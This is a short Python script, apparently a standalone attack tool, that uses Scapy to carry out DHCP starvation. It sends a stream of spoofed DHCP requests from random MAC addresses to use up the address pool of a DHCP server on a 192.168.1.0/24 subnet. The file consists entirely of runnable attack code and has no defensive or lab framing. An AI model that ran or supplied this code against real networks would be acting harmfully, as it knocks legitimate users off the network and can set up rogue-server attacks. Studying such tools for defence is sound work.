import sys
import os
import time

from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.volatile import RandMAC
from scapy.config import conf
from scapy.sendrecv import sendp


def dhcp_starvation(ip_subnet: str = "192.168.1.", server_ip: str = "192.168.1.1", start_host: int = 100,
                    end_host: int = 200):
    """Sends spoofed DHCP requests to exhaust the IP pool of a DHCP server."""
    layer2_broadcast = "ff:ff:ff:ff:ff:ff"

    # Disable Scapy IP address matching check for responses
    conf.checkIPaddr = False

    print(f"[*] Starting DHCP Starvation on target subnet {ip_subnet}0/24...")

    try:
        for ip in range(start_host, end_host + 1):
            for _ in range(8):
                bogus_mac = RandMAC()
                dhcp_request = (
                        Ether(src=bogus_mac, dst=layer2_broadcast) /
                        IP(src="0.0.0.0", dst="255.255.255.255") /
                        UDP(sport=68, dport=67) /
                        BOOTP(chaddr=bogus_mac) /
                        DHCP(options=[
                            ("message-type", "request"),
                            ("server_id", server_ip),
                            ("requested_addr", f"{ip_subnet}{ip}"),
                            "end"
                        ])
                )

                sendp(dhcp_request, verbose=False)
                print(f"[+] Requesting: {ip_subnet}{ip} from MAC: {bogus_mac}")
                time.sleep(0.5)

    except KeyboardInterrupt:
        print("\n[*] DHCP Starvation stopped by user.")


if __name__ == "__main__":
    dhcp_starvation()